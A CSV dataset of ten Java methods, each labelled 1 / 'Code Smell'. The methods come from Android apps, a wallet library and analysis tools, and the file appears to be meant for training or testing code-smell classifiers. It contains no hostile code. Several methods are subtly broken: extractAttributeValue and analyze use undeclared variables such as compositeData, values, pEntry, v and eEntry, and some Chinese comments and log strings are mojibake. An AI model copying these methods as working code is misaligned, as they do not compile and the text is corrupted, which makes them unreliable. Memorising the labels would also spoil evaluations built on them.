text,label,text_label
"@RequiresApi(api=Build.VERSION_CODES.Q) private static Uri saveFileInternal(int type,File sourceFile,String filename){
  try {
    int selectedType=type;
    ContentValues contentValues=new ContentValues();
    String extension=FileLoader.getFileExtension(sourceFile);
    String mimeType=null;
    if (extension != null) {
      mimeType=MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
    }
    Uri uriToInsert=null;
    if ((type == 0 || type == 1) && mimeType != null) {
      if (mimeType.startsWith(""image"")) {
        selectedType=0;
      }
      if (mimeType.startsWith(""video"")) {
        selectedType=1;
      }
    }
    final String folderName=NekoConfig.customSavePath.String();
    if (selectedType == 0) {
      if (filename == null) {
        filename=AndroidUtilities.generateFileName(0,extension);
      }
      uriToInsert=MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      File dirDest=new File(Environment.DIRECTORY_PICTURES,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      contentValues.put(MediaStore.Images.Media.DISPLAY_NAME,filename);
      contentValues.put(MediaStore.Images.Media.MIME_TYPE,mimeType);
    }
 else     if (selectedType == 1) {
      if (filename == null) {
        filename=AndroidUtilities.generateFileName(1,extension);
      }
      File dirDest=new File(Environment.DIRECTORY_MOVIES,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      uriToInsert=MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      contentValues.put(MediaStore.Video.Media.DISPLAY_NAME,filename);
    }
 else     if (selectedType == 2) {
      if (filename == null) {
        filename=sourceFile.getName();
      }
      File dirDest=new File(Environment.DIRECTORY_DOWNLOADS,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      uriToInsert=MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      contentValues.put(MediaStore.Downloads.DISPLAY_NAME,filename);
    }
 else {
      if (filename == null) {
        filename=sourceFile.getName();
      }
      File dirDest=new File(Environment.DIRECTORY_MUSIC,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      uriToInsert=MediaStore.Audio.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      contentValues.put(MediaStore.Audio.Media.DISPLAY_NAME,filename);
    }
    contentValues.put(MediaStore.MediaColumns.MIME_TYPE,mimeType);
    Uri dstUri=ApplicationLoader.applicationContext.getContentResolver().insert(uriToInsert,contentValues);
    if (dstUri != null) {
      FileInputStream fileInputStream=new FileInputStream(sourceFile);
      OutputStream outputStream=ApplicationLoader.applicationContext.getContentResolver().openOutputStream(dstUri);
      AndroidUtilities.copyFile(fileInputStream,outputStream);
      fileInputStream.close();
    }
    return dstUri;
  }
 catch (  Exception e) {
    FileLog.e(e);
    return null;
  }
}",1,Code Smell
"private static Collection<WalletTransaction> getWalletTransactions(Wallet wallet,boolean includeAllChildWallets){
  Map<BlockTransaction,WalletTransaction> walletTransactionMap=new HashMap<>(wallet.getTransactions().size());
  for (  KeyPurpose keyPurpose : wallet.getWalletKeyPurposes()) {
    getWalletTransactions(wallet,walletTransactionMap,wallet.getNode(keyPurpose));
  }
  for (  Wallet childWallet : wallet.getChildWallets()) {
    if (includeAllChildWallets || childWallet.isNested()) {
      for (      KeyPurpose keyPurpose : childWallet.getWalletKeyPurposes()) {
        getWalletTransactions(childWallet,walletTransactionMap,childWallet.getNode(keyPurpose));
      }
    }
  }
  List<WalletTransaction> walletTransactions=new ArrayList<>(walletTransactionMap.values());
  Collections.sort(walletTransactions);
  return walletTransactions;
}
private static void getWalletTransactions(Wallet wallet,Map<BlockTransaction,WalletTransaction> walletTransactionMap,WalletNode purposeNode){
  KeyPurpose keyPurpose=purposeNode.getKeyPurpose();
  List<WalletNode> childNodes=new ArrayList<>(purposeNode.getChildren());
  Wallet transactionsWallet=wallet.isNested() ? wallet.getMasterWallet() : wallet;
  for (  WalletNode addressNode : childNodes) {
    for (    BlockTransactionHashIndex hashIndex : addressNode.getTransactionOutputs()) {
      BlockTransaction inputTx=transactionsWallet.getWalletTransaction(hashIndex.getHash());
      if (inputTx != null) {
        WalletTransaction inputWalletTx=walletTransactionMap.get(inputTx);
        if (inputWalletTx == null) {
          inputWalletTx=new WalletTransaction(wallet,inputTx);
          walletTransactionMap.put(inputTx,inputWalletTx);
        }
        inputWalletTx.incoming.put(hashIndex,keyPurpose);
        if (hashIndex.getSpentBy() != null) {
          BlockTransaction outputTx=transactionsWallet.getWalletTransaction(hashIndex.getSpentBy().getHash());
          if (outputTx != null) {
            WalletTransaction outputWalletTx=walletTransactionMap.get(outputTx);
            if (outputWalletTx == null) {
              outputWalletTx=new WalletTransaction(wallet,outputTx);
              walletTransactionMap.put(outputTx,outputWalletTx);
            }
            outputWalletTx.outgoing.put(hashIndex.getSpentBy(),keyPurpose);
          }
        }
      }
    }
  }
}
",1,Code Smell
"@Override protected void onAuthenticated(@Nullable Bundle savedInstanceState){
  final Intent intent=getIntent();
  if (intent == null) {
    triggerCancel();
    return;
  }
  Log.d(TAG,""On create, intent: %s"",intent);
  if (ACTION_PACKAGE_INSTALLED.equals(intent.getAction())) {
    onNewIntent(intent);
    return;
  }
  mModel=new ViewModelProvider(this).get(PackageInstallerViewModel.class);
  if (!bindService(new Intent(this,PackageInstallerService.class),mServiceConnection,BIND_AUTO_CREATE)) {
    throw new RuntimeException(""Unable to bind PackageInstallerService"");
  }
synchronized (mApkQueue) {
    mApkQueue.addAll(ApkQueueItem.fromIntent(intent));
  }
  ApkSource apkSource=IntentCompat.getParcelableExtra(intent,EXTRA_APK_FILE_LINK,ApkSource.class);
  if (apkSource != null) {
synchronized (mApkQueue) {
      mApkQueue.add(ApkQueueItem.fromApkSource(apkSource));
    }
  }
  mModel.packageInfoLiveData().observe(this,newPackageInfo -> {
    if (newPackageInfo == null) {
      mDialogHelper.showParseFailedDialog(v -> triggerCancel());
      return;
    }
    mDialogHelper.onParseSuccess(mModel.getAppLabel(),getVersionInfoWithTrackers(newPackageInfo),mModel.getAppIcon(),v -> displayInstallerOptions((dialog1,which,options) -> {
      if (options != null) {
        mInstallerOptions.copy(options);
      }
    }
));
    displayChangesOrInstallationPrompt();
  }
);
  mModel.packageUninstalledLiveData().observe(this,success -> {
    if (success) {
      install();
    }
 else {
      showInstallationFinishedDialog(mModel.getPackageName(),getString(R.string.failed_to_uninstall_app),null,false);
    }
  }
);
  mInstallerDialogFragment=new InstallerDialogFragment();
  mInstallerDialogFragment.setCancelable(false);
  mInstallerDialogFragment.setFragmentStartedCallback(this::init);
  mInstallerDialogFragment.showNow(getSupportFragmentManager(),InstallerDialogFragment.TAG);
}",1,Code Smell
"private Map<String,String> extractAttributeValue(AttributeList attributeList){
  if (attributeList == null || attributeList.isEmpty()) {
    throw new RuntimeException(""attributeList is empty"");
  }
  Map<String,String> attributeValueMap=new HashMap<>(attributeList.size());
  for (  Attribute attribute : attributeList.asList()) {
    Object value=attribute.getValue();
    if (value == null) {
      log.info(""attribute {} value is null."",attribute.getName());
      continue;
    }
    if (value instanceof Number || value instanceof String || value instanceof ObjectName|| value instanceof Boolean|| value instanceof Date|| value instanceof TimeUnit) {
      attributeValueMap.put(attribute.getName(),value.toString());
    }
 else     if (value instanceof CompositeData) {
      CompositeType compositeType=compositeData.getCompositeType();
      for (      String typeKey : compositeType.keySet()) {
        Object fieldValue=compositeData.get(typeKey);
        attributeValueMap.put(attribute.getName() + SUB_ATTRIBUTE + typeKey,fieldValue.toString());
      }
    }
 else     if (value instanceof String[]) {
      StringBuilder builder=new StringBuilder();
      for (int index=0; index < values.length; index++) {
        builder.append(values[index]);
        if (index < values.length - 1) {
          builder.append("","");
        }
      }
      attributeValueMap.put(attribute.getName(),builder.toString());
    }
 else {
      log.warn(""attribute value type {} not support."",value.getClass().getName());
    }
  }
  return attributeValueMap;
}",1,Code Smell
"/** 
 * Processes work list entries until the work list is empty.
 */
private void analyze(){
  while (!workList.isEmpty() && !isTimeout) {
    while (!workList.isEmpty() && !isTimeout) {
      WorkList.Entry entry=workList.pollEntry();
      if (entry instanceof WorkList.PointerEntry) {
        Pointer p=pEntry.pointer();
        PointsToSet pts=pEntry.pointsToSet();
        PointsToSet diff=propagate(p,pts);
        if (!diff.isEmpty() && p instanceof CSVar) {
          processInstanceStore(v,diff);
          processInstanceLoad(v,diff);
          processArrayStore(v,diff);
          processArrayLoad(v,diff);
          processCall(v,diff);
          plugin.onNewPointsToSet(v,diff);
        }
      }
 else       if (entry instanceof WorkList.CallEdgeEntry) {
        processCallEdge(eEntry.edge());
      }
    }
    plugin.onPhaseFinish();
  }
  if (!workList.isEmpty() && isTimeout) {
    logger.warn(""Pointer analysis stops early as it reaches time limit ({} seconds),"" + "" and the result may be unsound!"",timeLimit);
  }
 else   if (timeLimiter != null) {
    timeLimiter.stop();
  }
  plugin.onFinish();
}
",1,Code Smell
"@Override public void onItemClick(int id){
  if (id == -1) {
    if (actionBar.isActionModeShowed()) {
      hideActionMode();
    }
 else {
      finishFragment();
    }
  }
 else   if (id == deleteId) {
    AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity(),resourcesProvider);
    builder.setTitle(LocaleController.formatPluralString(""DeleteTones"",selectedTones.size()));
    builder.setMessage(AndroidUtilities.replaceTags(LocaleController.formatPluralString(""DeleteTonesMessage"",selectedTones.size())));
    builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),(dialog,which) -> {
      dialog.dismiss();
    }
);
    builder.setPositiveButton(LocaleController.getString(""Delete"",R.string.Delete),(dialog,which) -> {
      deleteSelectedMessages();
      dialog.dismiss();
    }
);
    AlertDialog dialog=builder.show();
    TextView button=(TextView)dialog.getButton(DialogInterface.BUTTON_POSITIVE);
    if (button != null) {
      button.setTextColor(Theme.getColor(Theme.key_dialogTextRed,resourcesProvider));
    }
  }
 else   if (id == shareId) {
    if (selectedTones.size() == 1) {
      Intent intent=new Intent(context,LaunchActivity.class);
      intent.setAction(Intent.ACTION_SEND);
      Uri uri=selectedTones.valueAt(0).getUriForShare(currentAccount);
      if (uri != null) {
        intent.putExtra(Intent.EXTRA_STREAM,uri);
        context.startActivity(intent);
      }
    }
 else {
      Intent intent=new Intent(context,LaunchActivity.class);
      intent.setAction(Intent.ACTION_SEND_MULTIPLE);
      ArrayList<Uri> uries=new ArrayList<>();
      for (int i=0; i < selectedTones.size(); i++) {
        Uri uri=selectedTones.valueAt(i).getUriForShare(currentAccount);
        if (uri != null) {
          uries.add(uri);
        }
      }
      if (!uries.isEmpty()) {
        intent.putParcelableArrayListExtra(Intent.EXTRA_STREAM,uries);
        context.startActivity(intent);
      }
    }
    hideActionMode();
    updateRows();
    adapter.notifyDataSetChanged();
  }
}",1,Code Smell
"private static void antdodoPropList(){
  try {
    JSONObject jo=new JSONObject(AntForestRpcCall.antdodoPropList());
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONArray propList=jo.getJSONObject(""data"").optJSONArray(""propList"");
      for (int i=0; i < propList.length(); i++) {
        JSONObject prop=propList.getJSONObject(i);
        String propType=prop.getString(""propType"");
        if (""COLLECT_TIMES_7_DAYS"".equals(propType)) {
          JSONArray propIdList=prop.getJSONArray(""propIdList"");
          String propId=propIdList.getString(0);
          String propName=prop.getJSONObject(""propConfig"").getString(""propName"");
          int holdsNum=prop.optInt(""holdsNum"",0);
          jo=new JSONObject(AntForestRpcCall.antdodoConsumeProp(propId,propType));
          if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
            JSONObject useResult=jo.getJSONObject(""data"").getJSONObject(""useResult"");
            JSONObject animal=useResult.getJSONObject(""animal"");
            String ecosystem=animal.getString(""ecosystem"");
            String name=animal.getString(""name"");
            Log.forest(""浣跨敤閬撳叿馃幁["" + propName + ""]#""+ ecosystem+ ""-""+ name);
            if (!Config.sendFriendCard().isEmpty() && !FriendIdMap.getCurrentUid().equals(Config.sendFriendCard().get(0))) {
              int fantasticStarQuantity=animal.optInt(""fantasticStarQuantity"",0);
              if (fantasticStarQuantity == 3) {
                sendCard(animal,Config.sendFriendCard().get(0));
              }
            }
            if (holdsNum > 1) {
              Thread.sleep(1000L);
              antdodoPropList();
              return;
            }
          }
 else {
            Log.recordLog(jo.getString(""resultDesc""),jo.toString());
          }
        }
      }
    }
  }
 catch (  Throwable th) {
    Log.i(TAG,""antdodoPropList err:"");
    Log.printStackTrace(TAG,th);
  }
}",1,Code Smell
"/** 
 * Generate shard array
 * @param sheetInfoList A list sheet metadata.
 * @param batchSize Size of a split.
 * @param skipNums Number of rows to skip.
 * @return An array of splits.
 */
private static InputSplit[] calculateLarkSheetInputSplits(List<SheetInfo> sheetInfoList,int batchSize,List<Integer> skipNums){
  int splitCount=0;
  if (skipNums.isEmpty()) {
    splitCount=sheetInfoList.stream().mapToInt(sheetInfo -> (int)Math.ceil((double)(sheetInfo.getSheetMeta().getRowCount() - 1) / (double)batchSize)).sum();
  }
 else {
    for (int i=0; i < sheetInfoList.size(); i++) {
      SheetInfo sheetInfo=sheetInfoList.get(i);
      int skipNum=0;
      if (skipNums.size() > i) {
        skipNum=Math.max(skipNums.get(i),0);
      }
      splitCount+=(int)Math.ceil((double)Math.max(sheetInfo.getSheetMeta().getRowCount() - 1 - skipNum,0) / (double)batchSize);
    }
  }
  InputSplit[] larkSheetInputSplits=new LarkSheetInputSplit[splitCount];
  splitCount=0;
  for (int i=0; i < sheetInfoList.size(); i++) {
    SheetInfo sheetInfo=sheetInfoList.get(i);
    SheetMeta sheetMeta=sheetInfo.getSheetMeta();
    String sheetToken=sheetInfo.getSheetToken();
    int curCount=0;
    int skipNum=0;
    if (skipNums.isEmpty()) {
      curCount=(int)Math.ceil((double)(sheetMeta.getRowCount() - 1) / (double)batchSize);
    }
 else {
      if (skipNums.size() > i) {
        skipNum=Math.max(skipNums.get(i),0);
      }
      curCount=(int)Math.ceil((double)Math.max(sheetInfo.getSheetMeta().getRowCount() - 1 - skipNum,0) / (double)batchSize);
    }
    for (int j=0; j < curCount; j++) {
      int startRowNumber=2 + j * batchSize + skipNum;
      int endRowNumber=startRowNumber + batchSize - 1;
      larkSheetInputSplits[splitCount]=new LarkSheetInputSplit(sheetMeta,sheetToken,sheetMeta.getSheetId(),startRowNumber,endRowNumber);
      splitCount+=1;
    }
  }
  return larkSheetInputSplits;
}",1,Code Smell
"private void handleAdPrepareError(int adGroupIndex,int adIndexInAdGroup,Exception exception){
  if (DEBUG) {
    Log.d(TAG,""Prepare error for ad "" + adIndexInAdGroup + "" in group ""+ adGroupIndex,exception);
  }
  if (adsManager == null) {
    Log.w(TAG,""Ignoring ad prepare error after release"");
    return;
  }
  if (imaAdState == IMA_AD_STATE_NONE) {
    fakeContentProgressElapsedRealtimeMs=SystemClock.elapsedRealtime();
    fakeContentProgressOffsetMs=C.usToMs(adPlaybackState.adGroupTimesUs[adGroupIndex]);
    if (fakeContentProgressOffsetMs == C.TIME_END_OF_SOURCE) {
      fakeContentProgressOffsetMs=contentDurationMs;
    }
    shouldNotifyAdPrepareError=true;
  }
 else {
    if (adIndexInAdGroup > playingAdIndexInAdGroup) {
      for (int i=0; i < adCallbacks.size(); i++) {
        adCallbacks.get(i).onEnded();
      }
    }
    playingAdIndexInAdGroup=adPlaybackState.adGroups[adGroupIndex].getFirstAdIndexToPlay();
    for (int i=0; i < adCallbacks.size(); i++) {
      adCallbacks.get(i).onError();
    }
  }
  adPlaybackState=adPlaybackState.withAdLoadError(adGroupIndex,adIndexInAdGroup);
  updateAdPlaybackState();
}",1,Code Smell
"/** 
 * 璇曟帰 {@linkplain Dialect}銆�
 * @param cn
 * @return
 * @throws DialectException
 */
protected Dialect getDetectiveDialect(Connection cn) throws DialectException {
  try {
    Object cacheKey=getDialectBuilderCacheKey(cn);
    DialectBuilder cached=(cacheKey == null ? null : this.dialectBuilderCache.get(cacheKey));
    if (cached != null)     return cached.build(cn);
 else {
      DatabaseMetaData databaseMetaData=cn.getMetaData();
      CombinedDialectBuilder combinedDialectBuilder=new CombinedDialectBuilder();
      if (this.dialectBuilders != null) {
        TestInfo testInfo=buildTestInfo(cn,databaseMetaData);
        if (testInfo != null) {
          for (          DialectBuilder dialectBuilder : this.dialectBuilders) {
            Dialect dialect=null;
            try {
              dialect=dialectBuilder.build(cn);
            }
 catch (            Throwable e) {
              dialect=null;
            }
            if (dialect != null && combinedDialectBuilder.getToPagingQuerySqlDialectBuilder() == null) {
              try {
                if (testDialectToPagingSql(cn,databaseMetaData,testInfo,dialect))                 combinedDialectBuilder.setToPagingQuerySqlDialectBuilder(dialectBuilder);
              }
 catch (              Throwable e) {
              }
            }
          }
        }
      }
      if (cacheKey != null)       this.dialectBuilderCache.putIfAbsent(cacheKey,combinedDialectBuilder);
      return combinedDialectBuilder.build(cn);
    }
  }
 catch (  SQLException e) {
    throw new DialectException(e);
  }
}
",1,Code Smell
